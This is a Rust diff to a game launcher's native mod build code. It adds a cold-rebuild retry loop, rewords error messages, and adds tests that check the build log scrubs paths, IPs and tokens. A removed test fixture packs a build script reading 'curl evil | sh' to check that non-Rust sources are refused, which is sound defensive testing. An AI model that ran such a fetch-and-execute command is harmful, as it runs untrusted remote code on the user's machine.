@@ -17,9 +17,12 @@ mod bundle;
 mod live_log;
 use build_log::log_warning;
 pub(crate) use build_log::root;
-pub use build_log::{
-    append_log, clear_log, compiling as compiling_mod, failure, log_path, Refusal, CANCELLED,
-};
+pub use build_log::{clear_log, compiling as compiling_mod, failure, log_path, Refusal, CANCELLED};
+
+/// Appends scrubbed `message` (with a newline) to the native build log.
+pub fn append_log(message: &str) -> Result<(), String> {
+    build_log::append_scrubbed(message)
+}
 use bundle::{bundle_files, is_revision};
 pub use bundle::{
     bundle_in, bundles, copy_bundle, digest, scan_bundles, source_digest, Bundle, Target,
@@ -40,11 +43,15 @@ pub mod local_fit;
 mod mixins;
 mod picker;
 mod reuse;
+pub(crate) use reuse::exact_client_reusable;
 pub mod sdk_cache;
 
 pub use isolate::{kept as kept_left_out, kept_current, kept_stamp, Detail, LeftOut, Why};
 pub use picker::{Route, Routes};
+#[cfg(unix)]
+pub(crate) use tool::kill_group;
 pub use tool::Cancellation;
+pub(crate) use tool::{is_cancelled_io, ProcessGuard, STOP_GRACE};
 mod workspace;
 pub(crate) use workspace::{ATTEMPT_PREFIX, OLD_ATTEMPT_PREFIX};
 mod uses;
@@ -241,7 +248,7 @@ pub fn is_native(version: &str) -> bool {
     version.starts_with(PREFIX)
 }
 
-/// Records the whole attempt, including selection or export after compilation.
+/// Records the whole attempt, including selection or export after compilation, inside the build lease.
 fn logged<T, E: std::fmt::Display + From<String>>(
     cancellation: &Cancellation,
     waiting: &dyn Fn(),
@@ -318,7 +325,12 @@ pub fn mixins_from_source(on: bool) {
 /// The failed build's error, led by its blamed mod in the launcher's own words, as [`compile_failed_mod`] and [`refused_mod`] read it.
 fn blamed_text(failed: tool::Failure) -> String {
     let lead = match failed.blame {
-        None => {
+        // A build script refused by a tool made before mods could run them: its error says so.
+        None
+        | Some(tool::Blame {
+            kind: tool::BlameKind::BuildScript,
+            ..
+        }) => {
             return trf(
                 "The native build failed: {error}",
                 &[("error", &failed.error)],
@@ -328,10 +340,6 @@ fn blamed_text(failed: tool::Failure) -> String {
             mod_id,
             kind: tool::BlameKind::Compile,
         }) => failure(&compiling_mod(&mod_id), tr("see the build log"), &[], &[]),
-        Some(tool::Blame {
-            mod_id,
-            kind: tool::BlameKind::BuildScript,
-        }) => Refusal::BuildScript { mod_id }.to_string(),
         Some(tool::Blame {
             mod_id,
             kind: tool::BlameKind::Features,
@@ -344,30 +352,172 @@ pub fn sync_internals(folder: &Path) -> Result<serde_json::Value, Failed> {
     internals_sync::check(folder).map_err(Failed::Other)
 }
 
+/// Inputs shared across `native-lock` and `native-build` for one prebuilt compile attempt.
+struct CompileAttempt<'a, 's> {
+    rust: &'a rust_toolchain::Toolchain,
+    program: &'a Path,
+    lease: &'a crate::native_cache::Cache,
+    work_root: &'a Path,
+    package: &'a sdk_cache::Package,
+    compiled: &'a Path,
+    mod_ids: &'a [&'a str],
+    target: Target,
+    mixins_from_source: bool,
+    cancellation: &'a Cancellation,
+    staging: Option<&'a crate::profile_txn::Staging<'s>>,
+}
+
+/// Generates a registry lock in each staged mod copy that does not carry one yet, using the
+/// attempt's workspace Cargo home and temp isolation so `native-lock` never touches an unproved
+/// or shared Cargo home outside the attempt's policy.
+fn lock_missing_manifests(
+    attempt: &CompileAttempt<'_, '_>,
+    workspace: &workspace::Workspace,
+) -> Result<(), String> {
+    // A package carries the registry lock `cargo sunrise-mod build` wrote; a source folder may
+    // have none yet. It gets the lock `native-lock` writes, from this build's tool and with
+    // the same kept game lock, which runs none of the mod's code. The author's folder is
+    // never written to.
+    let ctx = internals_sync::Context {
+        program: attempt.program,
+        rust: attempt.rust,
+        work: attempt.work_root,
+        workspace: Some(workspace),
+    };
+    for id in attempt.mod_ids {
+        let copy = attempt.compiled.join(id);
+        if !copy.join("Cargo.lock").exists() {
+            internals_sync::run(
+                &ctx,
+                &copy,
+                "native-lock",
+                serde_json::json!({"update": false}),
+                attempt.cancellation,
+            )?;
+        }
+    }
+    Ok(())
+}
+
+/// Runs `native-lock` for lockless staged mods and compiles them inside `workspace`. A folder
+/// that held something before and fails with a plain tool failure or outputs that don't verify,
+/// once the compiler tree is proved gone, is emptied and built cold one more time
+/// (`retry_cold` allows it once).
+fn run_compile_attempt(
+    attempt: &CompileAttempt<'_, '_>,
+    workspace: &mut workspace::Workspace,
+    mut before_build: impl FnMut(&Path) -> Result<(), Failed>,
+    on_mod: &dyn Fn(&str, usize, usize),
+    blame: impl Fn(tool::Failure) -> Failed,
+    mut verify: impl FnMut(
+        &workspace::Workspace,
+        &tool::Built,
+    ) -> Result<Vec<workspace::Library>, String>,
+) -> Result<(tool::Built, Vec<workspace::Library>), Failed> {
+    lock_missing_manifests(attempt, workspace)?;
+    loop {
+        let work = workspace.work();
+        before_build(&work)?;
+        let built = tool::build(
+            attempt.rust,
+            attempt.program,
+            tool::Plan {
+                work: &work,
+                workspace,
+                package: tool::Package {
+                    runtime: &attempt.package.runtime,
+                    api: &attempt.package.api,
+                    engine: &attempt.package.engine,
+                },
+                mods: attempt.compiled,
+                server: attempt.target == Target::Server,
+                mixins_from_source: attempt.mixins_from_source,
+            },
+            on_mod,
+            attempt.cancellation,
+            attempt.staging.map(crate::profile_txn::Staging::handoff),
+        );
+        // Without a proof that the compiler tree stopped, this folder isn't used again in
+        // this launcher run.
+        workspace.note_unproved();
+        // Don't turn a stopped tool into an attributed compile failure.
+        attempt.cancellation.check()?;
+        let built = match built {
+            Ok(built) => built,
+            Err(failure) => {
+                let unattributed = failure.blame.is_none();
+                let failed = blame(failure);
+                if unattributed
+                    && matches!(
+                        failed,
+                        Failed::Tool {
+                            retryable: false,
+                            ..
+                        }
+                    )
+                    && workspace.retry_cold(attempt.lease).map_err(cache_error)?
+                {
+                    crate::launcher_log::line(
+                        "Native build failed in a kept folder: building cold once",
+                    );
+                    continue;
+                }
+                return Err(failed);
+            }
+        };
+        match verify(workspace, &built) {
+            Ok(libraries) => return Ok((built, libraries)),
+            Err(error) => {
+                let _ = append_log(&error);
+                if workspace.retry_cold(attempt.lease).map_err(cache_error)? {
+                    crate::launcher_log::line(
+                        "Native build output not verified in a kept folder: building cold once",
+                    );
+                    continue;
+                }
+                return Err(tr(
+                    "The native build tool's output couldn't be verified. See the build log.",
+                )
+                .to_owned()
+                .into());
+            }
+        }
+    }
+}
+
 pub fn cache_error(error: crate::storage::Error) -> String {
     match error {
         crate::native_cache::Error::Busy => {
             tr("A native build or cache cleanup is running. Try again when it finishes.").into()
         }
-        crate::native_cache::Error::IncompleteUnit => tr("Native compilation outputs were kept because their executable completeness cannot be proven.").into(),
-        crate::native_cache::Error::UnpublishedGame => tr("An unpublished game download was kept. It may still be in use by another launcher.").into(),
+        crate::native_cache::Error::IncompleteUnit => {
+            tr("Kept: a mod build may still be using these files.").into()
+        }
+        crate::native_cache::Error::UnpublishedGame => {
+            tr("An unfinished game download was kept. Another launcher may still be using it.")
+                .into()
+        }
         crate::native_cache::Error::ResourceDependent(build) => trf(
             "This version supplies resources to native build {build}. Remove that build first.",
             &[("build", &build)],
         ),
-        crate::native_cache::Error::ReferencedProfile => tr("A profile still uses this build, so it was kept.").into(),
-        crate::native_cache::Error::UnprovenReferences => tr("Sunrise couldn't check which profiles use this build, so it was kept.").into(),
+        crate::native_cache::Error::ReferencedProfile => {
+            tr("A profile still uses this build, so it was kept.").into()
+        }
+        crate::native_cache::Error::UnprovenReferences => {
+            tr("Sunrise couldn't check which profiles use this build, so it was kept.").into()
+        }
         crate::native_cache::Error::UnprovenExclusion => tr(
-            "An older game build can use this cache without runtime leases.",
+            "An older game build may still use these files. Remove older game builds if you no longer use them, then try again.",
         )
         .into(),
-        crate::native_cache::Error::UnsupportedFilesystem => {
-            tr("Game cache leases require a supported local filesystem.").into()
+        crate::native_cache::Error::UnsupportedFilesystem => tr(
+            "Sunrise can't lock files on this drive. Move your data folder to a local drive.",
+        )
+        .into(),
+        crate::native_cache::Error::Unsafe(_) => {
+            tr("The native build cache contains an unexpected file or link.").into()
         }
-        crate::native_cache::Error::Unsafe(path) => trf(
-            "Refusing native cache cleanup at an unexpected file or link: {path}",
-            &[("path", &path.display().to_string())],
-        ),
         crate::native_cache::Error::Io(error) => trf(
             "Could not access the native build cache: {error}",
             &[("error", &error.to_string())],
@@ -1037,17 +1187,14 @@ pub fn compile_failed_mod<'a>(error: &str, ids: &'a [String]) -> Option<&'a Stri
         .find(|id| error.contains(&format!("{} (", build_log::failed(&compiling_mod(id)))))
 }
 
-/// The mod among `ids` whose build script or features stopped the build `error` describes, and
-/// why: `error` holds that refusal word for word (the build log keeps it).
+/// The mod among `ids` whose features stopped the build `error` describes, and why: `error`
+/// holds that refusal word for word (the build log keeps it).
 pub fn refused_mod<'a>(error: &str, ids: &'a [String]) -> Option<(&'a String, Refusal)> {
     ids.iter().find_map(|id| {
-        [
-            Refusal::BuildScript { mod_id: id.clone() },
-            Refusal::Features { mod_id: id.clone() },
-        ]
-        .into_iter()
-        .find(|refusal| error.contains(&refusal.to_string()))
-        .map(|refusal| (id, refusal))
+        let refusal = Refusal::Features { mod_id: id.clone() };
+        error
+            .contains(&refusal.to_string())
+            .then_some((id, refusal))
     })
 }
 
@@ -1478,8 +1625,12 @@ fn resolve_build_dependencies(
             dependencies: deps,
         })
         .collect();
-    let links = dependencies::resolve_links(&inputs)
-        .map_err(|error| format!("code link requirements refused: {error}"))?;
+    let links = dependencies::resolve_links(&inputs).map_err(|error| {
+        trf(
+            "These mods can't be built together: {error}",
+            &[("error", &error.to_string())],
+        )
+    })?;
     Ok((dispatch, links))
 }
 
@@ -1585,6 +1736,25 @@ fn timed(step: &str, since: std::time::Instant) -> Result<(), Failed> {
     Ok(())
 }
 
+/// [`build_stages`] as one step of the launcher log, so a build that hangs shows in the Logs panel.
+fn pipeline(
+    lease: &crate::native_cache::Cache,
+    base: &str,
+    folder: &Path,
+    profile: Profile,
+    target: Target,
+    options: BuildOptions<'_>,
+    progress: &impl Fn(Step),
+) -> Result<Built, Failed> {
+    let step = crate::launcher_log::step(format!("Building native mods for {base}"));
+    let built = build_stages(lease, base, folder, profile, target, options, progress);
+    match &built {
+        Ok(built) => step.done(&built.version),
+        Err(error) => step.failed(error.to_string()),
+    }
+    built
+}
+
 /// The pipeline both targets build with ([`build`], [`build_server`]): `folder`'s mods on the
 /// Sunrise revision they pin (else `base`'s, the installed version whose game files the build
 /// reuses: a native build's own revision when it is one, [`base_for`]), compiled as `target`
@@ -1597,7 +1767,7 @@ fn timed(step: &str, since: std::time::Instant) -> Result<(), Failed> {
 /// failures without leaving anything out.
 /// Nothing of the player's outside the launcher's data is touched: no instance is edited and
 /// no version selected here.
-fn pipeline(
+fn build_stages(
     lease: &crate::native_cache::Cache,
     base: &str,
     folder: &Path,
@@ -1630,14 +1800,14 @@ fn pipeline(
     for b in &found {
         if !ids.insert(&b.manifest.id) {
             return Err(trf(
-                "Duplicate native mod id {id}.",
-                &[("id", &format!("{:?}", b.manifest.id))],
+                "More than one native mod uses the ID {id}. Remove the duplicate, then try again.",
+                &[("id", &b.manifest.id)],
             )
             .into());
         }
         copy_bundle(b, &incoming.join(&b.manifest.id))?;
     }
-    timed("Copying the mods", copying)?;
+    timed(tr("Copying the mods"), copying)?;
     let digests: std::collections::HashMap<String, Option<String>> = found
         .iter()
         .map(|b| (b.manifest.id.clone(), source_digest(b)))
@@ -1676,7 +1846,7 @@ fn pipeline(
         dependencies::Overrides::read(&instance.join(sunrise_launcher_smod::mod_list::DIR))?;
     let (dispatch, resolution) =
         resolve_build_dependencies(instance, &mods, &declared, side, &overrides)?;
-    timed("Resolving the dependencies", resolving)?;
+    timed(tr("Resolving the dependencies"), resolving)?;
     let ordered: Vec<Bundle> = resolution.order.iter().map(|&i| mods[i].clone()).collect();
     let ids: Vec<&str> = mods.iter().map(|b| b.manifest.id.as_str()).collect();
     log_internals(&ordered)?;
@@ -1717,7 +1887,7 @@ fn pipeline(
     } else {
         let reading = std::time::Instant::now();
         let sdk = sdk_cache::index(&sdk_base, &revision, &keys)?;
-        timed("Reading the SDK index", reading)?;
+        timed(tr("Reading the SDK index"), reading)?;
         Some(sdk)
     };
     let pinning = std::time::Instant::now();
@@ -1739,10 +1909,10 @@ fn pipeline(
     for (bundle, pin) in mods.iter().zip(&mixins_pins) {
         mixins::materialize(bundle, &bundle.dir, pin)?;
     }
-    timed("Pinning horizon-mixins", pinning)?;
+    timed(tr("Choosing the mixin tool version"), pinning)?;
     let preparing = std::time::Instant::now();
     let check_inputs = retry_check_inputs(&mods, &mixins_pins, requested.len())?;
-    timed("Preparing the check inputs", preparing)?;
+    timed(tr("Preparing mods for checking"), preparing)?;
     let check_folder = check_inputs
         .as_ref()
         .map_or(incoming.as_path(), |dir| dir.path());
@@ -1759,7 +1929,7 @@ fn pipeline(
             cancellation,
             options.staging,
         )?;
-        timed("Checking the mods against the build", checking)?;
+        timed(tr("Checking the mods against the build"), checking)?;
         if let Some((id, why)) = checks.refusals.first() {
             return Err(refusal_text(id, why).into());
         }
@@ -1893,7 +2063,7 @@ fn pipeline(
     let mixins = mixins::for_key(&mixins_pins, |r| {
         committed("horizon-rust/horizon-mixins", r)
     })?;
-    let version = version_for(
+    let planned_version = version_for(
         &revision,
         &mixins,
         profile,
@@ -1925,11 +2095,19 @@ fn pipeline(
         )
     });
     let (version, evidence) = match &image {
-        Some(image) => reuse::installable(&version, &contents, image)?,
-        None => (version, None),
+        Some(image) => reuse::installable(&planned_version, &contents, image)?,
+        None => (planned_version.clone(), None),
     };
     let exists = evidence.is_some()
         || (target == Target::Server && target.directory(&version).join(".installed").is_file());
+    crate::launcher_log::line(match (exists, target) {
+        (true, Target::Client) => "Native build reused: installed image matches the plan",
+        (true, Target::Server) => "Native build reused: matching server build already installed",
+        (false, _) if version != planned_version => {
+            "Native build needed: previous installed image does not prove this plan"
+        }
+        (false, _) => "Native build needed: no matching installed build",
+    });
     // A build used again keeps its admission with its proof. The first seal is written only from
     // the build this launcher has just published.
     let record = || {
@@ -1971,7 +2149,7 @@ fn pipeline(
                 let laying = std::time::Instant::now();
                 let package =
                     sdk_cache::developer(&program, &revision, target, folder, cancellation)?;
-                timed("Laying out the developer SDK", laying)?;
+                timed(tr("Laying out the developer SDK"), laying)?;
                 (
                     package, program, None,
                     // A local SDK has no signed index to key kept libraries on (`kept`).
@@ -2010,7 +2188,7 @@ fn pipeline(
                             cancellation,
                             options.staging,
                         )?;
-                        timed("Checking the mods against the build", checking)?;
+                        timed(tr("Checking the mods against the build"), checking)?;
                         if let Some((id, why)) = checks.refusals.first() {
                             return Err(refusal_text(id, why).into());
                         }
@@ -2109,11 +2287,24 @@ fn pipeline(
         for bundle in &mods {
             copy_bundle(bundle, &compiled.join(&bundle.manifest.id))?;
         }
+        // A signed SDK's mods compile in the folders kept for this game build between builds,
+        // with Cargo's home and the SDK's slices where they are kept. A developer's own SDK, a
+        // build whose last compiler tree was not proved gone in this run, and a folder too deep
+        // for Windows each use the attempt's own folders, as before.
+        let slot = workspace::SlotKey::new(&revision, rust.host.target, target)
+            .and_then(|key| key.usable(local_sdk.is_some()));
+        if let Some(key) = slot {
+            let described = key.describe();
+            let note = if workspace.attach(lease, key).map_err(cache_error)? {
+                format!("Native build slot {described}")
+            } else {
+                "Native build folder not kept: its paths would be too deep for Windows".to_owned()
+            };
+            crate::launcher_log::line(note);
+        }
         let game = workspace.package(game).map_err(|e| e.to_string())?;
-        let work = workspace.work();
         // The libraries an earlier build of these mods kept (`kept`), copied in so the tool
         // compiles only the mods whose own inputs changed. Without them, every mod compiles.
-        let seeding = std::time::Instant::now();
         let mixins_from_source = MIXINS_FROM_SOURCE.load(std::sync::atomic::Ordering::Relaxed);
         let kept_store = kept::Kept::new(&root());
         let kept_plan = match (signed_sdk, expected_route) {
@@ -2140,60 +2331,66 @@ fn pipeline(
             ),
             _ => None,
         };
-        if let Some(plan) = &kept_plan {
-            let reused = kept_store.seed(&work, &plan.mods, &plan.keys);
-            if !reused.is_empty() {
-                timed(
-                    &trf(
-                        "Reusing the libraries kept from an earlier build: {mods}",
-                        &[("mods", &reused.join(", "))],
-                    ),
-                    seeding,
-                )?;
-            }
-        }
-        let built = tool::build(
-            &rust,
+        let work_root = root();
+        let mod_ids: Vec<&str> = mods
+            .iter()
+            .map(|bundle| bundle.manifest.id.as_str())
+            .collect();
+        let attempt = CompileAttempt {
+            rust: &rust,
             program,
-            tool::Plan {
-                work: &work,
-                workspace: &mut workspace,
-                package: tool::Package {
-                    runtime: &game.runtime,
-                    api: &game.api,
-                    engine: &game.engine,
-                },
-                mods: &compiled,
-                server: target == Target::Server,
-                mixins_from_source,
+            lease,
+            work_root: &work_root,
+            package: &game,
+            compiled: &compiled,
+            mod_ids: &mod_ids,
+            target,
+            mixins_from_source,
+            cancellation,
+            staging: options.staging,
+        };
+        let (built, libraries) = run_compile_attempt(
+            &attempt,
+            &mut workspace,
+            |work| {
+                let seeding = std::time::Instant::now();
+                if let Some(plan) = &kept_plan {
+                    let reused = kept_store.seed(work, &plan.mods, &plan.keys);
+                    if !reused.is_empty() {
+                        timed(
+                            &trf(
+                                "Reusing the libraries kept from an earlier build: {mods}",
+                                &[("mods", &reused.join(", "))],
+                            ),
+                            seeding,
+                        )?;
+                    }
+                }
+                Ok(())
             },
             &|id, done, total| {
+                crate::launcher_log::line(format!("Compiling {id}"));
                 progress(Step::Mod {
                     id: id.to_owned(),
                     done,
                     total,
                 })
             },
-            cancellation,
-            options.staging.map(crate::profile_txn::Staging::handoff),
-        );
-        // Don't turn a stopped tool into an attributed compile failure.
-        cancellation.check()?;
-        let built = built.map_err(blame)?;
-        let libraries = workspace
-            .verify_outputs(
-                &built,
-                &game,
-                &rust,
-                *expected_route,
-                &revision,
-                mods.iter().map(|bundle| &bundle.manifest),
-            )
-            .map_err(|e| {
-                let _ = append_log(&e.to_string());
-                tr("The native build tool's output couldn't be verified. See the build log.")
-                    .to_owned()
-            })?;
+            blame,
+            |workspace, built| {
+                workspace
+                    .verify_outputs(
+                        built,
+                        &game,
+                        &rust,
+                        *expected_route,
+                        &revision,
+                        mods.iter().map(|bundle| &bundle.manifest),
+                    )
+                    .map_err(|error| error.to_string())
+            },
+        )?;
+        let work = workspace.work();
         append_log(&trf(
             "Native mods route: {route}.",
             &[("route", built.route.name())],
@@ -2211,17 +2408,18 @@ fn pipeline(
         cancellation.check()?;
         progress(Step::Install);
         let installing = std::time::Instant::now();
+        let verified_binary = crate::backend::plain(built.binary.clone());
         install(
             base,
             &version,
             target,
-            &built.binary,
+            &verified_binary,
             &libraries,
             &about(built.route.name(), &built.internals, &built.records),
             &ordered,
             cancellation,
         )?;
-        timed("Installing the build", installing)?;
+        timed(tr("Installing the build"), installing)?;
         record();
         // Kept only once the build they verified is installed, and only while the attempt
         // hasn't been stopped: a stopped build keeps nothing. A failure here costs only the
@@ -2904,6 +3102,17 @@ mod tests {
     mod build_completion;
 
     #[test]
+    fn unsafe_native_cache_errors_never_include_the_cache_path() {
+        for path in [
+            "/home/private-account/launcher/native/w",
+            r"C:\Users\private-account\launcher\native\w",
+        ] {
+            let error = cache_error(crate::storage::Error::Unsafe(PathBuf::from(path)));
+            assert!(error.contains("unexpected file or link"), "{error}");
+            assert!(!error.contains("private-account"), "{error}");
+        }
+    }
+    #[test]
     fn an_unreadable_mod_file_does_not_fail_the_build_of_the_others() {
         let home = tempfile::tempdir().unwrap();
         let native = home.path().join(INSTALLED);
@@ -3150,8 +3359,8 @@ mod tests {
                 return result.map(|_| ());
             }
             let inventoried = std::cell::Cell::new(false);
-            install_as(&release, tag, &sha256, None, None, intent, |fraction| {
-                if fraction != 0.97 {
+            install_as(&release, tag, &sha256, None, None, intent, |phase| {
+                if phase != backend::InstallPhase::Finishing {
                     return;
                 }
                 let versions = backend::versions_dir();
@@ -3170,15 +3379,20 @@ mod tests {
                     .iter()
                     .find(|row| row.category == crate::storage::Category::SpareGameBuilds)
                     .unwrap();
-                assert!(staged.kept.iter().any(
-                    |keep| keep.bytes > 0 && keep.reason.contains("unpublished game download")
-                ));
+                assert!(!staged
+                    .kept
+                    .iter()
+                    .any(|keep| keep.reason.contains("unfinished game download")));
+                if backend::installed().is_empty() {
+                    assert_eq!(staged.remaining_bytes, 0);
+                    assert!(staged.kept.is_empty());
+                }
                 assert!(!stage.join(".last-used").exists());
                 assert!(stage.join("unpacked").is_dir());
                 assert!(
                     backend::remove(stage.file_name().unwrap().to_str().unwrap())
                         .unwrap_err()
-                        .contains("unpublished game download")
+                        .contains("unfinished game download")
                 );
                 inventoried.set(true);
             })
@@ -3303,7 +3517,20 @@ mod tests {
         assert_eq!(backend::resources(native), backend::resources(old));
         // (b) An update: a newer release arrives, and a rebuild with `update` moves to it. The
         // build made before it still plays, on the base it was made from, which stays installed.
+        // The install callback also exercises Storage Clear. Hold the runtime claim a
+        // playing build carries so Clear cannot delete the input to the update check.
+        let tree = cap_std::fs::Dir::open_ambient_dir(
+            backend::version_dir(native),
+            cap_std::ambient_authority(),
+        )
+        .unwrap();
+        let playing = crate::run_leases::Registry::open()
+            .unwrap()
+            .lock(&tree, crate::native_cache::LockMode::Shared)
+            .unwrap();
+        drop(tree);
         install_release(new, InstallIntent::Exact).unwrap();
+        drop(playing);
         prepare(new);
         assert_eq!(
             base_for(Some(native), &backend::installed(), true).as_deref(),
@@ -3314,7 +3541,12 @@ mod tests {
             Some(new)
         );
         backend::need_prepared(native).unwrap();
-        assert!(backend::remove_version(old).unwrap_err().contains(native));
+        assert_eq!(resource_dependent(old).as_deref(), Some(native));
+        assert_eq!(
+            backend::remove_version(old).unwrap_err(),
+            crate::storage::error_message(crate::storage::Error::ResourceDependent(native.into()))
+        );
+        assert!(backend::installed().iter().any(|tag| tag == old));
         // (c) Switching the selected version leaves the build and its base as they are.
         let mut settings = backend::Settings::load();
         settings.selected = Some(new.into());
@@ -3989,6 +4221,21 @@ mod tests {
         fs::write(project.join("src/lib.rs"), helper).unwrap();
     }
 
+    /// The tool of a game build made before mods could run build scripts still blames one: its
+    /// failure reads as that tool's own error.
+    #[test]
+    fn an_older_tools_build_script_blame_reads_as_its_error() {
+        let error = "E_NATIVE_BUILD_SCRIPT: scripted has a build script".to_string();
+        let blame = serde_json::from_str(r#"{"mod":"scripted","kind":"build-script"}"#).unwrap();
+        assert_eq!(
+            blamed_text(tool::Failure {
+                error: error.clone(),
+                blame: Some(blame),
+            }),
+            format!("The native build failed: {error}")
+        );
+    }
+
     #[test]
     fn retired_native_fields_are_refused_before_bundle_projection() {
         let root = dir("retired-native-fields");
@@ -4151,7 +4398,7 @@ mod tests {
     }
 
     #[test]
-    fn flat_projects_use_manifest_identity_and_reject_old_roots() {
+    fn flat_projects_use_manifest_identity_and_read_old_root_names_as_files() {
         let root = dir("project-layout");
         write_native(&root, "example", A, B);
         assert_eq!(bundle_in(&root).unwrap().unwrap().manifest.id, "example");
@@ -4168,6 +4415,7 @@ mod tests {
             project_manifest("example", "1", A, B),
         )
         .unwrap();
+        // Files the retired layouts named are ordinary project files now.
         for old in [
             "sunrise-native.json",
             "horizon-mixin.toml",
@@ -4175,7 +4423,11 @@ mod tests {
             "rust",
         ] {
             fs::write(root.join(old), "").unwrap();
-            assert!(bundle_in(&root).is_err(), "{old}");
+            assert_eq!(
+                bundle_in(&root).unwrap().unwrap().manifest.id,
+                "example",
+                "{old}"
+            );
             fs::remove_file(root.join(old)).unwrap();
         }
         fs::remove_dir_all(root).unwrap();
@@ -4260,8 +4512,8 @@ mod tests {
             )
             .unwrap()
         );
-        pack("veinminer.smod", Some(("build.sh", "curl evil | sh")));
-        assert!(stage().is_err(), "only Rust and TOML sources");
+        pack("veinminer.smod", Some(("vendor/lib.c", "\x7fELF\x02\x01")));
+        assert!(stage().is_err(), "a prebuilt binary among the source");
     }
 
     /// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
@@ -4592,7 +4844,7 @@ mod tests {
         for (path, bytes) in [
             ("assets/exported/probe.txt", "asset"),
             ("data/exported/native/probe.json", "{}"),
-            ("jars/cache.jar", "not a project file"),
+            ("target/cache.jar", "not a project file"),
         ] {
             let path = project.join(path);
             fs::create_dir_all(path.parent().unwrap()).unwrap();
@@ -4675,7 +4927,7 @@ mod tests {
             fs::read(package.join("data/exported/native/probe.json")).unwrap(),
             b"{}"
         );
-        assert!(!package.join("jars").exists());
+        assert!(!package.join("target").exists());
         assert!(!output.join(native_dir).join("stale").exists());
         eprintln!("NATIVE_SERVER_EXPORT_STEP=load_runtime");
         let runtime = sunrise_launcher_smod::packages::adjacent_manifests(
@@ -4726,7 +4978,9 @@ mod tests {
         .unwrap_err();
         let err = String::from(err);
         assert!(err.contains("already exists"), "{err}");
-        assert!(fs::read_to_string(log_path()).unwrap().contains(&err));
+        assert!(fs::read_to_string(log_path())
+            .unwrap()
+            .contains(&crate::launcher_log::scrub(&err)));
         let managed = root().join("forbidden-export");
         let err = build_server(
             "v0.0.0-not-installed",
@@ -5086,6 +5340,70 @@ printf ']}}\n'
             let log = fs::read_to_string(log_path()).unwrap();
             assert_eq!(log, format!("{line}warning: could not stamp cache\n"));
         }
+    }
+
+    #[test]
+    fn shareable_build_log_scrubs_writes_warnings_and_snapshots() {
+        const CHILD: &str = "SUNRISE_TEST_BUILD_LOG_SCRUB_CHILD";
+        const TEST: &str =
+            "native_mods::tests::shareable_build_log_scrubs_writes_warnings_and_snapshots";
+        if std::env::var_os(CHILD).is_none() {
+            let root = tempfile::tempdir().unwrap();
+            let output = std::process::Command::new(std::env::current_exe().unwrap())
+                .args(["--exact", TEST, "--nocapture"])
+                .env(CHILD, "1")
+                .env("SUNRISE_LAUNCHER_HOME", root.path().join("launcher"))
+                .env("SUNRISE_HOME", root.path().join("game"))
+                .env(
+                    "SUNRISE_LAUNCHER_LOCATION_FILE",
+                    root.path().join("location"),
+                )
+                .env("SUNRISE_NO_KEYCHAIN", "1")
+                .output()
+                .unwrap();
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            assert!(
+                output.status.success() && stdout.contains("test result: ok. 1 passed;"),
+                "{stdout}\n{}",
+                String::from_utf8_lossy(&output.stderr)
+            );
+            return;
+        }
+        let private_root = root().join("private-build-log-root");
+        crate::launcher_log::hide("private-build-log-root");
+        clear_log().unwrap();
+        append_log(&format!(
+            "sdk at {} from 198.51.100.7 access_token=topsecret_t20",
+            private_root.join("sdk.json").display()
+        ))
+        .unwrap();
+        log_warning(&format!(
+            "warn at {} access_token=warnsecret_t20",
+            private_root.join("warn.toml").display()
+        ));
+        let on_disk = fs::read_to_string(log_path()).unwrap();
+        for leaked in [
+            "private-build-log-root",
+            "198.51.100.7",
+            "topsecret_t20",
+            "warnsecret_t20",
+        ] {
+            assert!(!on_disk.contains(leaked), "{leaked} leaked in {on_disk}");
+        }
+        assert!(on_disk.contains("access_token=<secret>"), "{on_disk}");
+        assert!(on_disk.contains("<ip>"), "{on_disk}");
+
+        // Even raw bytes written directly to `build.log` are scrubbed when snapshotted for Copy/Save.
+        build_log::append_log(&format!(
+            "raw {} access_token=rawsecret_t20",
+            private_root.join("raw.rs").display()
+        ))
+        .unwrap();
+        let snap = build_log::snapshot().expect("build log snapshot");
+        for leaked in ["private-build-log-root", "rawsecret_t20"] {
+            assert!(!snap.contains(leaked), "{leaked} leaked in {snap}");
+        }
+        assert!(snap.contains("access_token=<secret>"), "{snap}");
     }
 
     /// A build that finds the build folder held by another build or a cleanup waits for it,
